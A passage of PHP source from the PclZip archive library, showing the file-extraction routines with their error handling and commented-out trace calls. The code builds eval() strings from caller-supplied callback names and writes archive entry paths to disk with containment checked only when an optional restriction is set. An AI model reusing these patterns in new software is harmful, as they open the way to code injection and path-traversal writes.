              //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Look if index '$i' is in [".$p_options[PCLZIP_OPT_BY_INDEX][$j]['start'].",".$p_options[PCLZIP_OPT_BY_INDEX][$j]['end']."]");

              if (($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['start']) && ($i<=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end'])) {
                  //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Found as part of an index range");
                  $v_extract = true;
              }
              if ($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end']) {
                  //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Do not look this index range for next loop");
                  $j_start = $j+1;
              }

              if ($p_options[PCLZIP_OPT_BY_INDEX][$j]['start']>$i) {
                  //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Index range is greater than index, stop loop");
                  break;
              }
          }
      }

      // ----- Look for no rule, which means extract all the archive
      else {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Extract with no rule (extract all)");
          $v_extract = true;
      }

          // ----- Check compression method
          if (   ($v_extract)
              && (   ($v_header['compression'] != 8)
                      && ($v_header['compression'] != 0))) {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Unsupported compression method (".$v_header['compression'].")");
          $v_header['status'] = 'unsupported_compression';

          // ----- Look for PCLZIP_OPT_STOP_ON_ERROR
          if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
                      && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {
              //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "PCLZIP_OPT_STOP_ON_ERROR is selected, extraction will be stopped");

              $this->privSwapBackMagicQuotes();
              
              PclZip::privErrorLog(PCLZIP_ERR_UNSUPPORTED_COMPRESSION,
                                               "Filename '".$v_header['stored_filename']."' is "
                                                           ."compressed by an unsupported compression "
                                                           ."method (".$v_header['compression'].") ");

              //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
              return PclZip::errorCode();
                  }
          }
          
          // ----- Check encrypted files
          if (($v_extract) && (($v_header['flag'] & 1) == 1)) {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Unsupported file encryption");
          $v_header['status'] = 'unsupported_encryption';

          // ----- Look for PCLZIP_OPT_STOP_ON_ERROR
          if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
                      && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {
              //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "PCLZIP_OPT_STOP_ON_ERROR is selected, extraction will be stopped");

              $this->privSwapBackMagicQuotes();

              PclZip::privErrorLog(PCLZIP_ERR_UNSUPPORTED_ENCRYPTION,
                                               "Unsupported encryption for "
                                                           ." filename '".$v_header['stored_filename']
                                                                   ."'");

              //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
              return PclZip::errorCode();
                  }
    }

      // ----- Look for real extraction
      if (($v_extract) && ($v_header['status'] != 'ok')) {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "No need for extract");
          $v_result = $this->privConvertHeader2FileInfo($v_header,
                                                        $p_file_list[$v_nb_extracted++]);
          if ($v_result != 1) {
              $this->privCloseFd();
              $this->privSwapBackMagicQuotes();
              //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
              return $v_result;
          }

          $v_extract = false;
      }
      
      // ----- Look for real extraction
      if ($v_extract)
      {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Extracting file '".$v_header['filename']."', index '$i'");

        // ----- Go to the file position
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Position before rewind : ".ftell($this->zip_fd)."'");
        @rewind($this->zip_fd);
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Position after rewind : ".ftell($this->zip_fd)."'");
        if (@fseek($this->zip_fd, $v_header['offset']))
        {
          // ----- Close the zip file
          $this->privCloseFd();

          $this->privSwapBackMagicQuotes();

          // ----- Error log
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

          // ----- Return
          //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
          return PclZip::errorCode();
        }
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Position after fseek : ".ftell($this->zip_fd)."'");

        // ----- Look for extraction as string
        if ($p_options[PCLZIP_OPT_EXTRACT_AS_STRING]) {

          // ----- Extracting the file
          $v_result1 = $this->privExtractFileAsString($v_header, $v_string);
          if ($v_result1 < 1) {
            $this->privCloseFd();
            $this->privSwapBackMagicQuotes();
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result1);
            return $v_result1;
          }

          // ----- Get the only interesting attributes
          if (($v_result = $this->privConvertHeader2FileInfo($v_header, $p_file_list[$v_nb_extracted])) != 1)
          {
            // ----- Close the zip file
            $this->privCloseFd();
            $this->privSwapBackMagicQuotes();

            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
            return $v_result;
          }

          // ----- Set the file content
          $p_file_list[$v_nb_extracted]['content'] = $v_string;

          // ----- Next extracted file
          $v_nb_extracted++;
          
          // ----- Look for user callback abort
          if ($v_result1 == 2) {
                break;
          }
        }
        // ----- Look for extraction in standard output
        elseif (   (isset($p_options[PCLZIP_OPT_EXTRACT_IN_OUTPUT]))
                        && ($p_options[PCLZIP_OPT_EXTRACT_IN_OUTPUT])) {
          // ----- Extracting the file in standard output
          $v_result1 = $this->privExtractFileInOutput($v_header, $p_options);
          if ($v_result1 < 1) {
            $this->privCloseFd();
            $this->privSwapBackMagicQuotes();
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result1);
            return $v_result1;
          }

          // ----- Get the only interesting attributes
          if (($v_result = $this->privConvertHeader2FileInfo($v_header, $p_file_list[$v_nb_extracted++])) != 1) {
            $this->privCloseFd();
            $this->privSwapBackMagicQuotes();
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
            return $v_result;
          }

          // ----- Look for user callback abort
          if ($v_result1 == 2) {
                break;
          }
        }
        // ----- Look for normal extraction
        else {
          // ----- Extracting the file
          $v_result1 = $this->privExtractFile($v_header,
                                                      $p_path, $p_remove_path,
                                                                                          $p_remove_all_path,
                                                                                          $p_options);
          if ($v_result1 < 1) {
            $this->privCloseFd();
            $this->privSwapBackMagicQuotes();
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result1);
            return $v_result1;
          }

          // ----- Get the only interesting attributes
          if (($v_result = $this->privConvertHeader2FileInfo($v_header, $p_file_list[$v_nb_extracted++])) != 1)
          {
            // ----- Close the zip file
            $this->privCloseFd();
            $this->privSwapBackMagicQuotes();

            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
            return $v_result;
          }

          // ----- Look for user callback abort
          if ($v_result1 == 2) {
                break;
          }
        }
      }
    }

    // ----- Close the zip file
    $this->privCloseFd();
    $this->privSwapBackMagicQuotes();

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privExtractFile()
  // Description :
  // Parameters :
  // Return Values :
  //
  // 1 : ... ?
  // PCLZIP_ERR_USER_ABORTED(2) : User ask for extraction stop in callback
  // --------------------------------------------------------------------------------
  function privExtractFile(&$p_entry, $p_path, $p_remove_path, $p_remove_all_path, &$p_options)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, 'PclZip::privExtractFile', "path='$p_path', remove_path='$p_remove_path', remove_all_path='".($p_remove_all_path?'true':'false')."'");
    $v_result=1;

    // ----- Read the file header
    if (($v_result = $this->privReadFileHeader($v_header)) != 1)
    {
      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Found file '".$v_header['filename']."', size '".$v_header['size']."'");

    // ----- Check that the file header is coherent with $p_entry info
    if ($this->privCheckFileHeaders($v_header, $p_entry) != 1) {
        // TBC
    }

    // ----- Look for all path to remove
    if ($p_remove_all_path == true) {
        // ----- Look for folder entry that not need to be extracted
        if (($p_entry['external']&0x00000010)==0x00000010) {
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "The entry is a folder : need to be filtered");

            $p_entry['status'] = "filtered";

            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
            return $v_result;
        }

        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "All path is removed");
        // ----- Get the basename of the path
        $p_entry['filename'] = basename($p_entry['filename']);
    }

    // ----- Look for path to remove
    else if ($p_remove_path != "")
    {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Look for some path to remove");
      if (PclZipUtilPathInclusion($p_remove_path, $p_entry['filename']) == 2)
      {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "The folder is the same as the removed path '".$p_entry['filename']."'");

        // ----- Change the file status
        $p_entry['status'] = "filtered";

        // ----- Return
        //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
        return $v_result;
      }

      $p_remove_path_size = strlen($p_remove_path);
      if (substr($p_entry['filename'], 0, $p_remove_path_size) == $p_remove_path)
      {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Found path '$p_remove_path' to remove in file '".$p_entry['filename']."'");

        // ----- Remove the path
        $p_entry['filename'] = substr($p_entry['filename'], $p_remove_path_size);

        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Resulting file is '".$p_entry['filename']."'");
      }
    }

    // ----- Add the path
    if ($p_path != '') {
      $p_entry['filename'] = $p_path."/".$p_entry['filename'];
    }
    
    // ----- Check a base_dir_restriction
    if (isset($p_options[PCLZIP_OPT_EXTRACT_DIR_RESTRICTION])) {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Check the extract directory restriction");
      $v_inclusion
      = PclZipUtilPathInclusion($p_options[PCLZIP_OPT_EXTRACT_DIR_RESTRICTION],
                                $p_entry['filename']); 
      if ($v_inclusion == 0) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "PCLZIP_OPT_EXTRACT_DIR_RESTRICTION is selected, file is outside restriction");

        PclZip::privErrorLog(PCLZIP_ERR_DIRECTORY_RESTRICTION,
                                             "Filename '".$p_entry['filename']."' is "
                                                                 ."outside PCLZIP_OPT_EXTRACT_DIR_RESTRICTION");

        //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
        return PclZip::errorCode();
      }
    }

    // ----- Look for pre-extract callback
    if (isset($p_options[PCLZIP_CB_PRE_EXTRACT])) {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "A pre-callback '".$p_options[PCLZIP_CB_PRE_EXTRACT]."()') is defined for the extraction");

      // ----- Generate a local information
      $v_local_header = array();
      $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

      // ----- Call the callback
      // Here I do not use call_user_func() because I need to send a reference to the
      // header.
      eval('$v_result = '.$p_options[PCLZIP_CB_PRE_EXTRACT].'(PCLZIP_CB_PRE_EXTRACT, $v_local_header);');
      if ($v_result == 0) {
        // ----- Change the file status
        $p_entry['status'] = "skipped";
        $v_result = 1;
      }
      
      // ----- Look for abort result
      if ($v_result == 2) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "User callback abort the extraction");
        // ----- This status is internal and will be changed in 'skipped'
        $p_entry['status'] = "aborted";
        $v_result = PCLZIP_ERR_USER_ABORTED;
      }

      // ----- Update the informations
      // Only some fields can be modified
      $p_entry['filename'] = $v_local_header['filename'];
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "New filename is '".$p_entry['filename']."'");
    }

    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Extracting file (with path) '".$p_entry['filename']."', size '$v_header[size]'");

    // ----- Look if extraction should be done
    if ($p_entry['status'] == 'ok') {

    // ----- Look for specific actions while the file exist
    if (file_exists($p_entry['filename']))
    {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "File '".$p_entry['filename']."' already exists");

      // ----- Look if file is a directory
      if (is_dir($p_entry['filename']))
      {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Existing file '".$p_entry['filename']."' is a directory");

        // ----- Change the file status
        $p_entry['status'] = "already_a_directory";
        
        // ----- Look for PCLZIP_OPT_STOP_ON_ERROR
        // For historical reason first PclZip implementation does not stop
        // when this kind of error occurs.
        if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
                    && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "PCLZIP_OPT_STOP_ON_ERROR is selected, extraction will be stopped");

            PclZip::privErrorLog(PCLZIP_ERR_ALREADY_A_DIRECTORY,
                                             "Filename '".$p_entry['filename']."' is "
                                                                 ."already used by an existing directory");

            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
                }
      }
      // ----- Look if file is write protected
      else if (!is_writeable($p_entry['filename']))
      {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Existing file '".$p_entry['filename']."' is write protected");

        // ----- Change the file status
        $p_entry['status'] = "write_protected";

        // ----- Look for PCLZIP_OPT_STOP_ON_ERROR
        // For historical reason first PclZip implementation does not stop
        // when this kind of error occurs.
        if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
                    && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "PCLZIP_OPT_STOP_ON_ERROR is selected, extraction will be stopped");

            PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL,
                                             "Filename '".$p_entry['filename']."' exists "
                                                                 ."and is write protected");

            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
                }
      }

      // ----- Look if the extracted file is older
      else if (filemtime($p_entry['filename']) > $p_entry['mtime'])
      {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Existing file '".$p_entry['filename']."' is newer (".date("l dS of F Y h:i:s A", filemtime($p_entry['filename'])).") than the extracted file (".date("l dS of F Y h:i:s A", $p_entry['mtime']).")");
        // ----- Change the file status
        if (   (isset($p_options[PCLZIP_OPT_REPLACE_NEWER]))
                    && ($p_options[PCLZIP_OPT_REPLACE_NEWER]===true)) {
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "PCLZIP_OPT_REPLACE_NEWER is selected, file will be replaced");
                }
                else {
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "File will not be replaced");
            $p_entry['status'] = "newer_exist";

            // ----- Look for PCLZIP_OPT_STOP_ON_ERROR
            // For historical reason first PclZip implementation does not stop
            // when this kind of error occurs.
            if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
                        && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {
                //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "PCLZIP_OPT_STOP_ON_ERROR is selected, extraction will be stopped");

                PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL,
                                     "Newer version of '".$p_entry['filename']."' exists "
                                            ."and option PCLZIP_OPT_REPLACE_NEWER is not selected");

                //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
                return PclZip::errorCode();
                    }
                }
      }
      else {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Existing file '".$p_entry['filename']."' is older than the extrated one - will be replaced by the extracted one (".date("l dS of F Y h:i:s A", filemtime($p_entry['filename'])).") than the extracted file (".date("l dS of F Y h:i:s A", $p_entry['mtime']).")");
      }
    }

    // ----- Check the directory availability and create it if necessary
    else {
      if ((($p_entry['external']&0x00000010)==0x00000010) || (substr($p_entry['filename'], -1) == '/'))
        $v_dir_to_check = $p_entry['filename'];
      else if (!strstr($p_entry['filename'], "/"))
        $v_dir_to_check = "";
      else
        $v_dir_to_check = dirname($p_entry['filename']);

      if (($v_result = $this->privDirCheck($v_dir_to_check, (($p_entry['external']&0x00000010)==0x00000010))) != 1) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Unable to create path for '".$p_entry['filename']."'");

        // ----- Change the file status
        $p_entry['status'] = "path_creation_fail";

        // ----- Return
        ////--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
        //return $v_result;
        $v_result = 1;
      }
    }
    }

    // ----- Look if extraction should be done
    if ($p_entry['status'] == 'ok') {

      // ----- Do the extraction (if not a folder)
      if (!(($p_entry['external']&0x00000010)==0x00000010))
      {
        // ----- Look for not compressed file
        if ($p_entry['compression'] == 0) {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Extracting an un-compressed file");

                  // ----- Opening destination file
          if (($v_dest_file = @fopen($p_entry['filename'], 'wb')) == 0)
          {
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Error while opening '".$p_entry['filename']."' in write binary mode");

            // ----- Change the file status
            $p_entry['status'] = "write_error";

            // ----- Return
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
            return $v_result;
          }

          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Read '".$p_entry['size']."' bytes");

          // ----- Read the file by PCLZIP_READ_BLOCK_SIZE octets blocks
          $v_size = $p_entry['compressed_size'];
          while ($v_size != 0)
          {
            $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Read $v_read_size bytes");
            $v_buffer = @fread($this->zip_fd, $v_read_size);
            /* Try to speed up the code
            $v_binary_data = pack('a'.$v_read_size, $v_buffer);
            @fwrite($v_dest_file, $v_binary_data, $v_read_size);
            */
            @fwrite($v_dest_file, $v_buffer, $v_read_size);            
            $v_size -= $v_read_size;
          }

          // ----- Closing the destination file
          fclose($v_dest_file);

          // ----- Change the file mtime
          touch($p_entry['filename'], $p_entry['mtime']);
          

        }
        else {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Extracting a compressed file (Compression method ".$p_entry['compression'].")");
          // ----- TBC
          // Need to be finished
          if (($p_entry['flag'] & 1) == 1) {
              //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "File is encrypted");
            /*
              // ----- Read the encryption header
              //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Read 12 encryption header bytes");
              $v_encryption_header = @fread($this->zip_fd, 12);
              
              // ----- Read the encrypted & compressed file in a buffer
              //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Read '".($p_entry['compressed_size']-12)."' compressed & encrypted bytes");
              $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']-12);
              
              // ----- Decrypt the buffer
              $this->privDecrypt($v_encryption_header, $v_buffer,
                                             $p_entry['compressed_size']-12, $p_entry['crc']);
              //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Buffer is '".$v_buffer."'");
              */
          }
          else {
              //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Read '".$p_entry['compressed_size']."' compressed bytes");
              // ----- Read the compressed file in a buffer (one shot)
              $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']);
          }
          
          // ----- Decompress the file
          $v_file_content = @gzinflate($v_buffer);
          unset($v_buffer);
          if ($v_file_content === FALSE) {
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Unable to inflate compressed file");

            // ----- Change the file status
            // TBC
            $p_entry['status'] = "error";
            
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
            return $v_result;
          }
          
          // ----- Opening destination file
          if (($v_dest_file = @fopen($p_entry['filename'], 'wb')) == 0) {
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Error while opening '".$p_entry['filename']."' in write binary mode");

            // ----- Change the file status
            $p_entry['status'] = "write_error";

            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
            return $v_result;
          }

          // ----- Write the uncompressed data
          @fwrite($v_dest_file, $v_file_content, $p_entry['size']);
          unset($v_file_content);

          // ----- Closing the destination file
          @fclose($v_dest_file);

          // ----- Change the file mtime
          @touch($p_entry['filename'], $p_entry['mtime']);
        }

        // ----- Look for chmod option
        if (isset($p_options[PCLZIP_OPT_SET_CHMOD])) {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "chmod option activated '".$p_options[PCLZIP_OPT_SET_CHMOD]."'");

          // ----- Change the mode of the file
          @chmod($p_entry['filename'], $p_options[PCLZIP_OPT_SET_CHMOD]);
        }

        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Extraction done");
      }
    }

        // ----- Change abort status
        if ($p_entry['status'] == "aborted") {
      $p_entry['status'] = "skipped";
        }
        
    // ----- Look for post-extract callback
    elseif (isset($p_options[PCLZIP_CB_POST_EXTRACT])) {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "A post-callback '".$p_options[PCLZIP_CB_POST_EXTRACT]."()') is defined for the extraction");

      // ----- Generate a local information
      $v_local_header = array();
      $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

      // ----- Call the callback
      // Here I do not use call_user_func() because I need to send a reference to the
      // header.
      eval('$v_result = '.$p_options[PCLZIP_CB_POST_EXTRACT].'(PCLZIP_CB_POST_EXTRACT, $v_local_header);');

      // ----- Look for abort result
      if ($v_result == 2) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "User callback abort the extraction");
        $v_result = PCLZIP_ERR_USER_ABORTED;
      }
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privExtractFileInOutput()
  // Description :
  // Parameters :
  // Return Values :
  // --------------------------------------------------------------------------------
  function privExtractFileInOutput(&$p_entry, &$p_options)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, 'PclZip::privExtractFileInOutput', "");
    $v_result=1;

    // ----- Read the file header
    if (($v_result = $this->privReadFileHeader($v_header)) != 1) {
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Found file '".$v_header['filename']."', size '".$v_header['size']."'");

    // ----- Check that the file header is coherent with $p_entry info
    if ($this->privCheckFileHeaders($v_header, $p_entry) != 1) {
        // TBC
    }

    // ----- Look for pre-extract callback
    if (isset($p_options[PCLZIP_CB_PRE_EXTRACT])) {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "A pre-callback '".$p_options[PCLZIP_CB_PRE_EXTRACT]."()') is defined for the extraction");

      // ----- Generate a local information
      $v_local_header = array();
      $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

      // ----- Call the callback
      // Here I do not use call_user_func() because I need to send a reference to the
      // header.
      eval('$v_result = '.$p_options[PCLZIP_CB_PRE_EXTRACT].'(PCLZIP_CB_PRE_EXTRACT, $v_local_header);');
      if ($v_result == 0) {
        // ----- Change the file status
        $p_entry['status'] = "skipped";
        $v_result = 1;
      }

      // ----- Look for abort result
      if ($v_result == 2) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "User callback abort the extraction");
        // ----- This status is internal and will be changed in 'skipped'
        $p_entry['status'] = "aborted";
        $v_result = PCLZIP_ERR_USER_ABORTED;
      }

      // ----- Update the informations
      // Only some fields can be modified
      $p_entry['filename'] = $v_local_header['filename'];
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "New filename is '".$p_entry['filename']."'");
    }

    // ----- Trace
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Extracting file (with path) '".$p_entry['filename']."', size '$v_header[size]'");

    // ----- Look if extraction should be done
    if ($p_entry['status'] == 'ok') {

      // ----- Do the extraction (if not a folder)
      if (!(($p_entry['external']&0x00000010)==0x00000010)) {
        // ----- Look for not compressed file
        if ($p_entry['compressed_size'] == $p_entry['size']) {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Extracting an un-compressed file");
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Reading '".$p_entry['size']."' bytes");

          // ----- Read the file in a buffer (one shot)
          $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']);

          // ----- Send the file to the output
          echo $v_buffer;
          unset($v_buffer);
        }
        else {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Extracting a compressed file");
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Reading '".$p_entry['size']."' bytes");

          // ----- Read the compressed file in a buffer (one shot)
          $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']);
          
          // ----- Decompress the file
          $v_file_content = gzinflate($v_buffer);
          unset($v_buffer);

          // ----- Send the file to the output
          echo $v_file_content;
          unset($v_file_content);
        }
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Extraction done");
      }
    }

        // ----- Change abort status
        if ($p_entry['status'] == "aborted") {
      $p_entry['status'] = "skipped";
        }

    // ----- Look for post-extract callback
    elseif (isset($p_options[PCLZIP_CB_POST_EXTRACT])) {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "A post-callback '".$p_options[PCLZIP_CB_POST_EXTRACT]."()') is defined for the extraction");

      // ----- Generate a local information
      $v_local_header = array();
      $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

      // ----- Call the callback
      // Here I do not use call_user_func() because I need to send a reference to the
      // header.
      eval('$v_result = '.$p_options[PCLZIP_CB_POST_EXTRACT].'(PCLZIP_CB_POST_EXTRACT, $v_local_header);');

      // ----- Look for abort result
      if ($v_result == 2) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "User callback abort the extraction");
        $v_result = PCLZIP_ERR_USER_ABORTED;
      }
    }

    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privExtractFileAsString()
  // Description :
  // Parameters :
  // Return Values :
  // --------------------------------------------------------------------------------
  function privExtractFileAsString(&$p_entry, &$p_string)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, 'PclZip::privExtractFileAsString', "p_entry['filename']='".$p_entry['filename']."'");
    $v_result=1;

    // ----- Read the file header
    $v_header = array();
    if (($v_result = $this->privReadFileHeader($v_header)) != 1)
    {
      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Found file '".$v_header['filename']."', size '".$v_header['size']."'");

    // ----- Check that the file header is coherent with $p_entry info
    if ($this->privCheckFileHeaders($v_header, $p_entry) != 1) {
        // TBC
    }

    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Extracting file in string (with path) '".$p_entry['filename']."', size '$v_header[size]'");

    // ----- Do the extraction (if not a folder)
    if (!(($p_entry['external']&0x00000010)==0x00000010))
    {
      // ----- Look for not compressed file
